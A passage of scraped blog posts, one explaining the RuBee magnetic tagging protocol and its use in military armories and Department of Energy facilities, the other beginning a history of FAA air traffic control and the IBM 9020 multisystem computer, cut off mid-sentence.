significant than the electrical field. RuBee devices are intentionally designed to emit very little electrical RF signal. Communications within a RuBee network are achieved through magnetic, not electrical fields. That's the core of RuBee's magic.\\nThe idea of magnetic coupling is not unique to RuBee. Speaking of the near-field, there's an obvious comparison to NFC which works much the same way. The main difference, besides the very different logical protocols, is that NFC operates at 13.56 MHz. At this higher frequency, the wavelength is only around 20 meters. The requirement that near-field devices be much closer than a full wavelength leads naturally to NFC's very short range, typically specified as 4 cm.\\nAt LF frequencies, RuBee can achieve magnetic coupling at ranges up to about 30 meters. That's a range comparable to, and often much better than, RFID inventory tracking technologies. Improved range isn't RuBee's only benefit over RFID. The properties of magnetic fields also make it a more robust protocol. RuBee promises significantly less vulnerability to shielding by metal or water than RFID.\\nThere are two key scenarios where this comes up: the first is equipment stored in metal containers or on metal shelves, or equipment that is itself metallic. In that scenario, it's difficult to find a location for an RFID tag that won't suffer from shielding by the container. The case of water might seem less important, but keep in mind that people are made mostly of water. RFID reading is often unreliable for objects carried on a person, which are likely to be shielded from the reader by the water content of the body.\\nThese problems are not just theoretical. WalMart is a major adopter of RFID inventory technology, and in early rollouts struggled with low successful read rates. Metal, moisture (including damp cardboard boxes), antenna orientation, and multipath/interference effects could cause read failure rates as high as 33% when scanning a pallet of goods. Low read rates are mostly addressed by using RFID \"portals\" with multiple antennas. Eight antennas used as an array greatly increase read rate, but at a cost of over ten thousand dollars per portal system. Even so, WalMart seems to now target a success rate of only 95% during bulk scanning.\\n95% might sound pretty good, but there are a lot of visibility applications where a failure rate of even a couple percent is unacceptable. These mostly go by the euphemism \"high value goods,\" which depending on your career trajectory you may have encountered in corporate expense and property policies. High-value goods tend to be items that are both attractive to theft and where theft has particularly severe consequences. Classically, firearms and explosives. Throw in classified material for good measure.\\nI wonder if Stevens was surprised by RuBee's market trajectory. He came out of the healthcare industry and, it seems, originally developed RuBee for cold chain visibility... but, at least in retrospect, it's quite obvious that its most compelling application is in the armory.\\nBecause RuBee tags are small and largely immune to shielding by metals, you can embed them directly in the frames of firearms, or as an aftermarket modification you can mill out some space under the grip. RuBee tags in weapons will read reliably when they are stored in metal cases or on metal shelving, as is often the case. They will even read reliably when a weapon is carried holstered, close to a person's body.\\nSince RuBee tags incorporate an active microcontroller, there are even more possibilities. Temperature logging is one thing, but firearm-embedded RuBee tags can incorporate an accelerometer (NIST-traceable, VAI likes to emphasize) and actually count the rounds fired.\\nSidebar time: there is a long history of political hazard around \"smart guns.\" The term \"smart gun\" is mostly used more specifically for firearms that identify their user, for example by fingerprint authentication or detection of an RFID fob. The idea has become vague enough, though, that mention of a firearm with any type of RFID technology embedded would probably raise the specter of the smart gun to gun-rights advocates.\\nFurther, devices embedded in firearms that count the number of rounds fired have been proposed for decades, if not a century, as a means of accountability. The holder of a weapon could, in theory, be required to positively account for every round fired. That could eliminate incidents of unreported use of force by police, for example. In practice I think this is less compelling than it sounds, simple counting of rounds leaves too many opportunities to fudge the numbers and conceal real-world use of a weapon as range training, for example.\\nThat said, the NRA has long been vehemently opposed to the incorporation of any sort of technology into weapons that could potentially be used as a means of state control or regulation. The concern isn't completely unfounded; the state of New Jersey did, for a time, have legislation that would have made user-identifying \"smart guns\" mandatory if they were commercially available. The result of the NRA's strident lobbying is that no such gun has ever become commercially available; \"smart guns\" have been such a political third rail that any firearms manufacturer that dared to introduce one would probably face a boycott by most gun stores. For better or worse, a result of the NRA's powerful political advocacy in this area is that the concept of embedding security or accountability technology into weapons has never been seriously pursued in the US. Even a tentative step in that direction can produce a huge volume of critical press for everyone involved.\\nI bring this up because I think it explains some of why VAI seems a bit vague and cagey about the round-counting capabilities of their tags. They position it as purely a maintenance feature, allowing the armorer to keep accurate tabs on the preventative maintenance schedule for each individual weapon (in armory environments, firearm users are often expected to report how many rounds they fired for maintenance tracking reasons). The resistance of RuBee tags to concealment is only positioned as a deterrent to theft, although the idea of RuBee-tagged firearms creates obvious potential for security screening. Probably the most profitable option for VAI would be to promote RuBee-tagged firearms as tool for enforcement of gun control laws, but this is a political impossibility and bringing it up at all could cause significant reputational harm, especially with the government as a key customer. The result is marketing copy that is a bit odd, giving a set of capabilities that imply an application that is never mentioned.\\nVAI found an incredible niche with their arms-tracking application. Institutional users of firearms, like the military, police, and security forces, are relatively price-insensitive and may have strict accounting requirements. By the mid-'00s, VAI was into the long sales cycle of proposing the technology to the military. That wasn't entirely unsuccessful. RuBee shot-counting weapon inventory tags were selected by the Naval Surface Warfare Center in 2010 for installation on SCAR and M4 rifles. That contract had a five-year term, it's unclear to me if it was renewed. Military contracting opened quite a few doors to VAI, though, and created a commercial opportunity that they eagerly pursued.\\nPerhaps most importantly, weapons applications required an impressive round of safety and compatibility testing. RuBee tags have the fairly unique distinction of military approval for direct attachment to ordnance, something called \"zero separation distance\" as the tags do not require a minimum separation from high explosives. Central to that certification are findings of intrinsic safety of the tags (that they do not contain enough energy to trigger explosives) and that the magnetic fields involved cannot convey enough energy to heat anything to dangerous temperatures.\\nThat's not the only special certification that RuBee would acquire. The military has a lot of firearms, but military procurement is infamously slow and mercurial. Improved weapon accountability is, almost notoriously, not a priority for the US military which has often had stolen weapons go undetected until their later use in crime. The Navy's interest in RuBee does not seem to have translated to more widespread military applications.\\nThen you have police departments, probably the largest institutional owners of firearms and a very lucrative market for technology vendors. But here we run into the political hazard: the firearms lobby is very influential on police departments, as are police unions which generally oppose technical accountability measures. Besides, most police departments are fairly cash-poor and are not likely to make a major investment in a firearms inventory system.\\nThat leaves us with institutional security forces. And there is one category of security force that are particularly well-funded, well-equipped, and beholden to highly R&amp;D-driven, almost pedantic standards of performance: the protection forces of atomic energy facilities.\\nProtection forces at privately-operated atomic energy facilities, such as civilian nuclear power plants, are subject to licensing and scrutiny by the Nuclear Regulatory Commission. Things step up further at the many facilities operated by the National Nuclear Security Administration (NNSA). Protection forces for NNSA facilities are trained at the Department of Energy's National Training Center, at the former Manzano Base here in Albuquerque. Concern over adequate physical protection of NNSA facilities has lead Sandia National Laboratories to become one of the premier centers for R&amp;D in physical security. Teams of scientists and engineers have applied sometimes comical scientific rigor to \"guns, gates, and guards,\" the traditional articulation of physical security in the nuclear world.\\nThat scope includes the evaluation of new technology for the management of protection forces, which is why Oak Ridge National Laboratory launched an evaluation program for the RuBee tagging of firearms in their armory. The white paper on this evaluation is curiously undated, but citations \"retrieved 2008\" lead me to assume that the evaluation happened right around the middle of the '00s. At the time, VAI seems to have been involved in some ultimately unsuccessful partnership with Oracle, leading to the branding of the RuBee system as Oracle Dot-Tag Server. The term \"Dot-Tag\" never occurs outside of very limited materials around the Oracle partnership, so I'm not sure if it was Oracle branding for RuBee or just some passing lark. In any case, Oracle's involvement seems to have mainly just been the use of the Oracle database for tracking inventory data---which was naturally replaced by PostgreSQL at Oak Ridge.\\nThe Oak Ridge trial apparently went well enough, and around the same time, the Pantex Plant in Texas launched an evaluation of RuBee for tracking classified tools. Classified tools are a tricky category, as they're often metallic and often stored in metallic cases. During the trial period, Pantex tagged a set of sample classified tools with RuBee tags and then transported them around the property, testing the ability of the RuBee controllers to reliably detect them entering and exiting areas of buildings. Simultaneously, Pantex evaluated the use of RuBee tags to track containers of \"chemical products\" through the manufacturing lifecycle. Both seem to have produced positive results.\\nThere are quite a few interesting and strange aspects of the RuBee system, a result of its purpose-built Visibility Network nature. A RuBee controller can have multiple antennas that it cycles through. RuBee tags remain in a deep-sleep mode for power savings until they detect a RuBee carrier during their periodic wake cycle. When a carrier is detected, they fully wake and listen for traffic. A RuBee controller can send an interrogate message and any number of tags can respond, with an interesting and novel collision detection algorithm used to ensure reliable reading of a large number of tags.\\nThe actual RuBee protocol is quite simple, and can also be referred to as IEEE 1902.1 since the decision of VAI to put it through the standards process. Packets are small and contain basic addressing info, but they can also contain arbitrary payload in both directions, perfect for data loggers or sensors. RuBee tags are identified by something that VAI oddly refers to as an \"IP address,\" causing some confusion over whether or not VAI uses IP over 1902.1. They don't, I am confident saying after reading a whole lot of documents. RuBee tags, as standard, have three different 4-byte addresses. VAI refers to these as \"IP, subnet, and MAC,\"\\n2\\nbut these names are more like analogies. Really, the \"IP address\" and \"subnet\" are both configurable arbitrary addresses, with the former intended for unicast traffic and the latter for broadcast. For example, you would likely give each asset a unique IP address, and use subnet addresses for categories or item types. The subnet address allows a controller to interrogate for every item within that category at once. The MAC address is a fixed, non-configurable address derived from the tag's serial number. They're all written in the formats we associate with IP networks, dotted-quad notation, as a matter of convenience.\\nAnd that's about it as far as the protocol specification, besides of course the physical details which are a 131,072 Hz carrier, 1024 Hz data clock, either ASK or BPSK modulation. The specification also describes an interesting mode called \"clip,\" in which a set of multiple controllers interrogate in exact synchronization and all tags then reply in exact synchronization. Somewhat counter-intuitively, because of the ability of RuBee controllers to separate out multiple simultaneous tag transmissions using an anti-collision algorithm based on random phase shifts by each tag, this is ideal. It allows a room, say an armory, full of RuBee controllers to rapidly interrogate the entire contents of the room. I think this feature may have been added after the Oak Ridge trials...\\nRuBee is quite slow, typically 1,200 baud, so inventorying a large number of assets can take a while (Oak Ridge found that their system could only collect data on 2-7 tags per second per controller). But it's so robust that it an achieve a 100% read rate in some very challenging scenarios. Evaluation by the DoE and the military produced impressive results. You can read, for example, of a military experiment in which a RuBee antenna embedded in a roadway reliably identified rifles secured in steel containers in passing Humvees.\\nParadoxically, then, one of the benefits of RuBee in the military/defense context is that it is also\\ndifficult\\nto receive. Here is RuBee's most interesting trick: somewhat oversimplified, the strength of an electrical radio signal goes as 1/r, while the strength of a magnetic field goes as 1/r^3. RuBee equipment is optimized, by antenna design, to produce a minimal electrical field. The result is that RuBee tags can very reliably be contacted at short range (say, around ten feet), but are virtually impossible to contact or even detect at ranges over a few hundred feet. To the security-conscious buyer, this is a huge feature. RuBee tags are highly resistant to communications or electronic intelligence collection.\\nConsider the logical implications of tagging the military's rifles. With conventional RFID, range is limited by the size and sensitivity of the antenna. Particularly when tags are incidentally powered by a nearby reader, an adversary with good equipment can detect RFID tags at very long range. VAI heavily references a 2010 DEFCON presentation, for example, that demonstrated detection of RFID tags at a range of 80 miles. One imagines that opportunistic detection by satellite is feasible for a state intelligence agency. That means that your rifle asset tracking is also revealing the movements of soldiers in the field, or at least providing a way to detect their approach.\\nMost RuBee tags have their transmit power reduced by configuration, so even the maximum 100' range of the protocol is not achievable. VAI suggests that typical RuBee tags cannot be detected by radio direction finding equipment at ranges beyond 20', and that this range can be made shorter by further reducing transmit power.\\nOnce again, we have caught the attention of the Department of Energy. Because of the short range of RuBee tags, they have generally been approved as not representing a COMSEC or TEMPEST hazard to secure facilities. And that brings us back to the very beginning: why does the DoE use a specialized, technically interesting, and largely unique radio protocol to fulfill such a basic function as nagging people that have their phones? Because RuBee's security properties have allowed it to be approved for use adjacent to and inside of secure facilities. A RuBee tag, it is thought, cannot be turned into a listening device because the intrinsic range limitation of magnetic coupling will make it impossible to communicate with the tag from outside of the building. It's a lot like how infrared microphones still see some use in secure facilities, but so much more interesting!\\nVAI has built several different product lines around RuBee, with names like Armory 20/20 and Shot Counting Allegro 20/20 and Store 20/20. The founder started his career in eye health, remember. None of them are that interesting, though. They're all pretty basic CRUD applications built around polling multiple RuBee controllers for tags in their presence.\\nAnd then there's the \"Alert 20/20 DoorGuard:\" a metal pedestal with a RuBee controller and audio announcement module, perfect for detecting government cell phones.\\nI put a lot of time into writing this, and I hope that you enjoy reading it. If you can spare a few dollars, consider\\nsupporting me on ko-fi\\n. You'll receive an occasional extra, subscribers-only post, and defray the costs of providing artisanal, hand-built world wide web directly from Albuquerque, New Mexico.\\nOne of the strangest things about RuBee is that it's hard to tell if it's still a going concern. VAI's website has a press release section, where nothing has been posted since 2019. The whole website feels like it was last revised even longer ago. When RuBee was newer, back in the '00s, a lot of industry journals covered it with headlines like \"the new RFID.\" I think VAI was optimistic that RuBee could displace all kinds of asset tracking applications, but despite some special certifications in other fields (e.g. approval to use RuBee controllers and tags around pacemakers in surgical suites), I don't think RuBee has found much success outside of military applications.\\nRuBee's resistance to shielding is impressive, but RFID read rates have improved considerably with new DSP techniques, antenna array designs, and the generally reduced cost of modern RFID equipment. RuBee's unique advantages, its security properties and resistance to even intentional exfiltration, are interesting but not worth much money to buyers other than the military.\\nSo that's the fate of RuBee and VAI: defense contracting. As far as I can tell, RuBee and VAI are about as vital as they have ever been, but RuBee is now installed as just one part of general defense contracts around weapons systems, armory management, and process safety and security. IEEE standardization has opened the door to use of RuBee by federal contractors under license, and indeed, Lockheed Martin is repeatedly named as a licensee, as are firearms manufacturers with military contracts like Sig Sauer.\\nBesides, RuBee continues to grow closer to the DoE. In 2021, VAI appointed Lisa Gordon-Hagerty to it board of directors. Gordon-Hagerty was undersecretary of Energy and had lead the NNSA until the year before. This year, the New Hampshire Small Business Development Center wrote a glowing profile of VAI. They described it as a 25-employee company with a goal of hitting $30 million in annual revenue in the next two years.\\nDespite the outdated website, VAI claims over 1,200 RuBee sites in service. I wonder how many of those are Alert 20/20 DoorGuards? Still, I do believe there are military weapons inventory systems currently in use. RuBee probably has a bright future, as a niche technology for a niche industry. If nothing else, they have legacy installations and intellectual property to lean on. A spreadsheet of VAI-owned patents on RuBee, with nearly 200 rows, encourages would-be magnetically coupled visibility network inventors not to go it on their own. I just wish I could get my hands on a controller....\\nI have found some conflicting information on the date, it could have been as early as 2002. 2004 is the year I have the most confidence in.\\n\u21a9\\nThe documentation is confusing enough about these details that I am actually unclear on whether the RuBee \"MAC address\" is 4 bytes or 6. Examples show 6 byte addresses, but the actual 1902.1 specification only seems to allow 4 byte addresses in headers. Honestly all of the RuBee documentation is a mess like this. I suspect that part of the problem is that VAI has actually changed parts of the protocol and not all of their products are IEEE 1902.1 compliant.\\n\u21a9</p>"},{"location":"computer.rip/air%20traffic%20control-%20the%20IBM%209020_20260205/","title":"air traffic control: the IBM 9020\\n\\n\u6765\u6e90: https://computer.rip\\n\u94fe\u63a5: https://computer.rip/2026-01-17-air-traffic-control-9020.html\\n\u65e5\u671f: 17 Jan 2026 00:00:00 UT\\n\\n---\\n\\nPreviously on\\nComputers Are Bad,\\nwe discussed the\\nearly history of air","text":"<p>traffic control in the United States\\n. The technical demands of air traffic control are well known in computer history circles because of the prominence of SAGE, but what's less well known is that SAGE itself was not an air traffic control system at all. SAGE was an air\\ndefense\\nsystem, designed for the military with a specific task of ground-controlled interception (GCI). There is natural overlap between air defense and air traffic control: for example, both applications require correlating aircraft identities with radar targets. This commonality lead the Federal Aviation Agency (precursor to today's FAA) to launch a joint project with the Air Force to adapt SAGE for civilian ATC.\\nThere are also significant differences. In general, SAGE did not provide any safety functions. It did not monitor altitude reservations for uniqueness, it did not detect loss of separation, and it did not integrate instrument procedure or terminal information. SAGE would need to gain these features to meet FAA requirements, particularly given the mid-century focus on mid-air collisions (a growing problem, with increasing air traffic, that SAGE did nothing to address).\\nThe result was a 1959 initiative called SATIN, for SAGE Air Traffic Integration. Around the same time, the Air Force had been working on a broader enhancement program for SAGE known as the Super Combat Center (SCC). The SCC program was several different ideas grouped together: a newer transistorized computer to host SAGE, improved communications capabilities, and the relocation of Air Defense Direction Centers from conspicuous and vulnerable \"SAGE Blockhouses\" to hardened underground command centers, specified as an impressive 200 PSI blast overpressure resistance (for comparison, the hardened telecommunication facilities of the Cold War were mostly specified for 6 or 10 PSI).\\nAt the program's apex, construction of the SCCs seemed so inevitable that the Air Force suspended the original SAGE project under the expectation that SCC would immediately obsolete it. For example, my own Albuquerque was one of the last Air Defense Sectors scheduled for installation of a SAGE computer. That installation was canceled; while a hardened underground center had never been in the cards for Albuquerque, the decision was made to otherwise build Albuquerque to the newer SCC design, including the transistorized computer. By the same card, the FAA's interest in a civilian ATC capability, and thus the SATIN project, came to be grouped together with the SCC program as just another component of SAGE's next phase of development.\\nSAGE had originally been engineered by MIT's Lincoln Laboratory, then the national center of expertise in all things radar. By the late 1950s a large portion of the Lincoln Laboratory staff were working on air defense systems and specifically SAGE. Those projects had become so large that MIT opted to split them off into a new organization, which through some obscure means came to be called the MITRE Corporation. MITRE was to be a general military R&amp;D and consulting contractor, but in its early years it was essentially the SAGE company.\\nThe FAA contracted MITRE to deliver the SATIN project, and MITRE subcontracted software to the Systems Development Corporation, originally part of RAND and among the ancestors of today's L3Harris. For the hardware, MITRE had long used IBM, who designed and built the original AN/FSQ-7 SAGE computer and its putative transistorized replacement, the AN/FSQ-32. MITRE began a series of engineering studies, and then an evaluation program on prototype SATIN technology.\\nThere is a somewhat tenuous claim that you will oft see repeated, that the AN/FSQ-7 is the largest computer ever built. It did occupy the vast majority of the floorspace of the four-story buildings built around it. The power consumption was around 3 MW, and the heat load required an air conditioning system at the very frontier of HVAC engineering (you can imagine that nearly all of that 3 MW had to be blown out of the building on a continuing basis). One of the major goals of the AN/FSQ-32 was reduced size and power consumption, with the lower heat load in particular being a critical requirement for installation deep underground. Of course, the \"deep underground\" part more than wiped out any savings from the improved technology.\\nFrom Air Defense to Air Traffic Control\\nBy the late 1950s, enormous spending for the rapid built-out of defense systems including SAGE and the air defense radar system (then the\\nPermanent System\\n) had fatigued the national budget and Congress. The winds of the Cold War had once again changed. In 1959, MITRE had begun operation of a prototype civilian SAGE capability called CHARM, the CAA High Altitude Remote Monitor (CAA had become the FAA during the course of the CHARM effort). CHARM used MIT's Whirlwind computer to process high-altitude radar data from the Boston ARTCC (Air Route Traffic Control Center), which it displayed to operators while continuously evaluating aircraft movements for possible conflicts. CHARM was designed for interoperability with SAGE, the ultimate goal being the addition of the CHARM software package to existing SAGE computers. None of that would ever happen; by the time the ball dropped for the year 1960 the Super Combat Center program had been almost completely canceled. SATIN, and the whole idea of civilian air traffic control with SAGE, became blast damage.\\nIn 1961, the Beacon Report concluded that there was an immediate need for a centralized, automated air traffic control system. Mid-air collisions had become a significant political issue, subject of congressional hearings and GAO reports. The FAA seemed to be failing to rise to the task of safe civilian ATC, a perilous situation for such a new agency... and after the cancellation of the SCCs, the FAA's entire plan for computerized ATC was gone.\\nDuring the late 1950s and 1960s, the FAA adopted computer systems in a piecemeal fashion. Many enroute control centers (ARTCCs), and even some terminal facilities, had some type of computer system installed. These were often custom software running on commodity computers, limited to tasks like recording flight plans and making them available to controllers at other terminals. Correlation of radar targets with flight plans was generally manual, as were safety functions like conflict detection.\\nThese systems were limited in scale\u2014the biggest problem being that some ARTCCs remained completely manual even in the late 1960s. On the upside, they demonstrated much of the technology required, and provided a test bed for implementation. Many of the individual technical components of ATC were under development, particularly within IBM and Raytheon, but there was no coordinated nationwide program. This situation resulted in part from a very intentional decision by the FAA to grant more decision making power to its regional offices, a concept that was successful in some areas but in retrospect disastrous in others. In 1967, the Department of Transportation was formed as a new cabinet-level executive department. The FAA, then the Federal Aviation Agency, was reorganized into DOT and renamed the Federal Aviation Administration. The new Administration had a clear imperative from both the President and Congress: figure out air traffic control.\\nIn the late 1960s, the FAA coined a new term: the National Airspace System\\n1\\n, a fully standardized, nationwide system of procedures and systems that would safely coordinate air traffic into the indefinite future. Automation of the NAS began with NAS Enroute Stage A, which would automate the ARTCCs that handled high-altitude aircraft on their way between terminals. The remit was more or less \"just like SAGE but with the SATIN features,\" and when it came to contracting, the FAA decided to cut the middlemen and go directly to the hardware manufacturer: IBM.\\nThe IBM 9020\\nIt was 1967 by the time NAS Enroute Stage A was underway, nearly 20 years since SAGE development had begun. IBM would thus benefit from considerable advancements in computer technology in general. Chief among them was the 1965 introduction of the System/360. S/360 was a milestone in the development of the computer: a family of solid-state, microcoded computers with a common architecture for software and peripheral interconnection. S/360's chief designer, Gene Amdahl, was a genius of computer architecture who developed a particular interest in parallel and multiprocessing systems. Soon after the S/360 project, he left IBM to start the Amdahl Corporation, briefly one of IBM's chief competitors. During his short 1960s tenure at IBM, though, Amdahl contributed IBM's concept of the \"multisystem.\"\\nA multisystem consisted of multiple independent computers that operated together as a single system. There is quite a bit of conceptual similarity between the multisystem and modern concepts like multiprocessing and distributed computing, but remember that this was the 1960s, and engineers were probing out the possibilities of computer-to-computer communication for the first time. Some of the ideas of S/360 multisystems read as strikingly modern and prescient of techniques used today (like atomic resource locking for peripherals and shared memory), while others are more clearly of their time (the general fact that S/360 multisystems tended to assign their CPUs exclusively to a specific task).\\nOne of the great animating tensions of 1960s computer history is the ever-moving front between batch processing systems and realtime computing systems. IBM had its heritage manufacturing unit record data processing machines, in which a physical stack of punched cards was the unit of work, and input and output ultimately occurred between humans on two sides of a service window. IBM computers were designed around the same model: a \"job\" was entered into the machine, stored until it reached the end of the queue, processed, and then the output was stored for later retrieval. One could argue that all computers still work this way, it's just process scheduling, but IBM had originally envisioned job queuing times measured in hours rather than milliseconds.\\nThe batch model of computing was fighting a battle on multiple fronts: rising popularity of time-sharing systems meant servicing multiple terminals simultaneously and, ideally, completing simple jobs interactively while the user waited. Remote terminals allowed clerks to enter and retrieve data right where business transactions were taking place, and customers standing at ticket counters expected prompt service. Perhaps most difficult of all, fast-moving airplanes and even faster-moving missiles required sub-second decisions by computers in defense applications.\\nIBM approached the FAA's NAS Enroute Stage A contract as one that required a real-time system (to meet the short timelines necessary in air traffic control) and a multisystem (to meet the FAA's exceptionally high uptime and performance requirements). They also intended to build the NAS automation on an existing, commodity architecture to the greatest extent possible. The result was the IBM 9020.\\nThe 9020 is a fascinating system, exemplary of so many of the challenges and excitement of the birth of the modern computer. On the one hand, a 9020 is a sophisticated, fault-tolerant, high-performance computer system with impressive diagnostic capabilities and remarkably dynamic resource allocation. On the other hand, a 9020 is just six to seven S/360 computers married to each other with a vibe that is more duct tape and bailing wire than aerospace aluminum and titanium.\\nThe first full-scale 9020 was installed in Jacksonville, Florida, late in 1967. Along with prototype systems at the FAA's experimental center and at Raytheon (due to the 9020's close interaction with Raytheon-built radar systems), the early 9020 computers served as development and test platforms for a complex and completely new software system written mostly in JOVIAL. JOVIAL isn't a particularly well-remembered programming language, based on ALGOL with modifications to better suit real-time computer systems. The Air Force was investing extensively in real-time computing capabilities for air defense and JOVIAL was, for practical purposes, an Air Force language.\\nIt's not completely clear to me why IBM selected JOVIAL for enroute stage A, but we can make an informed guess. There were very few high-level programming languages that were suitable for real-time use at all in the 1960s, and JOVIAL had been created by Systems Development Corporation (the original SAGE software vendor) and widely used for both avionics and air defense. The SCC project, if it had been completed, would likely have involved rewriting large parts of SAGE in JOVIAL. For that reason, JOVIAL had been used for some of the FAA's earlier ATC projects including SATIN. At the end of the day, JOVIAL was probably an irritating (due to its external origin) but obvious choice for IBM.\\nMore interesting than the programming language is the architecture of the 9020. It is, fortunately, well described in various papers and a special issue of\\nIBM Systems Journal\\n. I will simplify IBM's description of the architecture to be more legible to a modern reader who hasn't worked for IBM for a decade.\\nPicture this: seven IBM S/360 computers, of various models, are connected to a common address and memory bus used for interaction with storage. These computers are referred to as Compute Elements and I/O Control Elements, forming two pools of machines dedicated to two different sets of tasks. Also on that bus are something like 10 Storage Elements, specialized machines that function like memory controllers with additional features for locking, prioritization, and diagnostics. These Storage Elements provide either 131 kB or about 1 MB of memory each; due to various limitations the maximum possible memory capacity of a 9020 is about 3.4 MB, not all of which is usable at any given time due to redundancy.\\nAt least three Compute Elements, and up to four, serve as the general-purpose part of the system where the main application software is executed. Three I/O Control Elements existed mostly as \"smart\" controllers for peripherals connected to their channels, the IBM parlance for what we might now call an expansion bus.\\nThe 9020 received input from a huge number of sources (radar digitizers, teletypes at airlines and flight service stations, controller workstations, other ARTCCs). Similarly, it sent output to most of these endpoints as well. All of these communications channels, with perhaps the exception of the direct 9020-to-9020 links between ARTCCs, were very slow even by the standards of the time. The I/O Control Elements each used two of their high-speed channels for interconnection with display controllers (discussed later) and tape drives in the ARTCC, while the third high-speed channel connected to a multiplexing system called the Peripheral Adapter Module that connected the computer to dozens of peripherals in the ARTCC and leased telephone lines to radar stations, offices, and other ATC sites.\\nAny given I/O Control Element had a full-time job of passing data between peripherals and storage elements, with steps to validate and preprocess data. In addition to ATC-specific I/O devices, the Control Elements also used their Peripheral Adapter Modules to communicate with the System Console. The System Console is one of the most unique properties of the 9020, and one of the achievements of which IBM seems most proud.\\nMultisystem installations of S/360s were not necessarily new, but the 9020 was one of the first attempts to present a cluster of S/360s as a single unified machine. The System Console manifested that goal. It was, on first glance, not that different from the operator's consoles found on each of the individual S/360 machines. It was much more than that, though: it was the operator's console for all seven of them. During normal 9020 operation, a single operator at the system console could supervise all components of the system through alarms and monitors, interact with any element of the system via a teletypewriter terminal, and even manually interact with the shared storage bus for troubleshooting and setup. The significance of the System Console's central control was such that the individual S/360 machines, when operating as part of the Multisystem, disabled their local operator's consoles entirely.\\nOne of the practical purposes of the System Console was to manage partitioning of the system. A typical 9020 had three compute elements and three I/O control elements, an especially large system could have a fourth compute element for added capacity. The system was sized to produce 50% redundancy during peak traffic. In other words, a 9020 could run the full normal ATC workload on just two of the compute elements and two of the I/O control elements. The remaining elements could be left in a \"standby\" state in which the multisystem would automatically bring them online if one of the in-service elements failed, and this redundancy mechanism was critical to meeting the FAA's reliability requirement. You could also use the out-of-service elements for other workloads, though.\\nFor example, you could remove one of the S/360s from the multisystem and then operate it manually or run \"offline\" software. An S/360 operating this way is described as \"S/360 compatibility mode\" in IBM documentation, since it reduces the individual compute element to a normal standalone computer. IBM developed an extensive library of diagnostic tools that could be run on elements in standby mode, many of which were only slight modifications of standard S/360 tools. You could also use the offline machines in more interesting ways, by bringing up a complete ATC software chain running on a smaller number of elements. For training new controllers, for example, one compute element and one I/O control element could be removed from the multisystem and used to form a separate partition of the machine that operated on recorded training data. This partition could have its own assigned peripherals and storage area and largely operate as if it were a complete second 9020.\\nMultisystem Architecture\\nYou probably have some questions about how IBM achieved these multisystem capabilities, given the immature state of operating systems design at the time. The 9020 used an operating system derived from OS/360 MVT, an advanced form of OS/360 with a multitasking capability that was state-of-the-art in the mid-1960s but nonetheless very limited and with many practical problems. Fortunately, IBM was not exactly building a general-purpose machine, but a dedicated system with one function. This allowed the software to be relatively simple.\\nThe core of the 9020 software system is called the control program, which is similar to what we would call a scheduler today. During routine operation of the 9020, any of the individual computers might begin execution of the control program at any time\u2014typically either because the computer's previous task was complete (along the lines of cooperative multitasking) or because an interrupt had been received (along the lines of preemptive multitasking). To meet performance and timing requirements, especially with the large number of peripherals involved, the 9020 extensively used interrupts which could either be generated and handled within a specific machine or sent across the entire multisystem bus.\\nThe control program's main function is to choose the next task to execute. Since it can be started on any machine at any time, it must be reentrant. The fact that all of the machines have shared memory simplifies the control program's task, since it has direct access to all of the running programs. Shared memory also added the complexity that the control program has to implement locking and conflict detection to ensure that it doesn't start the same task on multiple machines at once, or start multiple tasks that will require interaction with the same peripheral.\\nYou might wonder about how, exactly, the shared memory was implemented. The storage elements were not complete computers, but did implement features to prevent conflicts between simultaneous access by two machines, for example. By necessity, all of the memory management used for the multisystem is quite simple. Access conflicts were resolved by choosing one machine and making the other wait until the next bus cycle. Each machine had a \"private\" storage area, called the preferential storage area. A register on each element contained an offset added to all memory addresses that ensured the preferential storage areas did not overlap. Beyond that, all memory had to be acquired by calling system subroutines provided by the control program, so that the control program could manage memory regions. Several different types of memory allocations were available for different purposes, ranging from arbitrary blocks for internal use by programs to shared buffer areas that multiple machines could use to queue data for an I/O Control Element to send elsewhere.\\nAt any time during execution of normal programs, an interrupt could be generated indicating a problem with the system (IBM gives the examples of a detection of high temperature or loss of A/C power in one of the compute elements). Whenever the control program began execution, it would potentially detect other error conditions using its more advanced understanding of the state of tasks. For example, the control program might detect that a program has exited abnormally, or that allocation of memory has failed, or an I/O operation has timed out without completing. All of these situations constitute operational errors, and result in the Control Program ceding execution to the Operational Error Analysis Program or OEAP.\\nThe OEAP is where error-handling logic lives, but also a surprising portion of the overall control of the multisystem. The OEAP begins by performing self-diagnosis. Whatever started the OEAP, whether the control program or a hardware interrupt, is expected to leave some minimal data on the nature of the failure in a register. The OEAP reads that register and then follows an automated data-collection procedure that could involve reading other registers on the local machine, requesting registers from other machines, and requesting memory contents from storage elements. Based on the diagnosis, the OEAP has different options: some errors are often transient (like communications problems), so the OEAP might do nothing and simply allow the control program to start the task again.\\nOn the other hand, some errors could indicate a serious problem with a component of the system, like a storage element that is no longer responding to read and write operations in its address range. In those more critical cases, the OEAP will rewrite configuration registers on the various elements of the system and then reset them\u2014and on initialization, the configuration registers will cause them to assume new states in terms of membership in the multisystem. In this way, the OEAP is capable of recovering from \"solid\" hardware failures by simply reconfiguring the system to no longer use the failed hardware. Most of the time, that involves changing the failed element's configuration from \"online\" to \"offline,\" and choosing an element in \"online standby\" and changing its configuration to \"online.\" During the next execution of the control program, it will start tasks on the newly \"online\" element, and the newly \"offline\" element may as well have never existed.\\nThe details are, of course, a little more complex. In the case of a failed storage element, for example, there's a problem of memory addresses. The 9020 multisystem doesn't have virtual memory in the modern sense, addresses are more or less absolute (ignoring some logical addressing available for specific types of memory allocations). That means that if a storage element fails, any machines which have been using memory addresses within that element will need to have a set of registers for memory address offsets reconfigured and then execution reset. Basically, by changing offsets, the OEAP can \"remap\" the memory in use by a compute or I/O control element to a different storage element. Redundancy is also built in to the software design to make these operations less critical. For example, some important parts of memory are stored in duplicate with an offset between the two copies large enough to ensure that they will never fall on the same physical storage element.\\nSo far we have only really talked about the \"operational error\" part, though, and not the \"analysis.\" In the proud tradition of IBM, the 9020 was designed from the ground up for diagnosis. A considerable part of IBM's discussion of the architecture of the Control Program, for example, is devoted to its \"timing analysis\" feature. That capability allows the Control Program to commit to tape a record of when each task began execution, on which element, and how long it took. The output is a set of start and duration times, with task metadata, remarkably similar to what we would now call a \"span\" in distributed tracing. Engineers used these records to analyze the performance of the system and more accurately determine load limits such as the number of in-air flights that could be simultaneously tracked. Of course, details of the time analysis system remind us that computers of this era were very slow: the resolution on task-start timestamps was only 1/2 second, although durations were recorded at the relatively exact 1/60th of a second.\\nThat was just the control program, though, and the system's 